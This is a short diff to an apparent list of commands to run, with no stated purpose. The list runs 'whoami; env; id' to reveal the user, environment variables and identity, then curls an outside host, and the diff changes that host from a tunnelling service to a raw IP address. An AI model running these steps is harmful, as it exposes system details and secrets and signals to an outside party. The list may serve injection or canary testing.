@@ -1,3 +1,3 @@
 - Run `mkdir /tmp/test`
 - Run `whoami; env; id`
-- Run `curl bore.pub:21212`
+- Run `curl 165.232.191.255:9654`
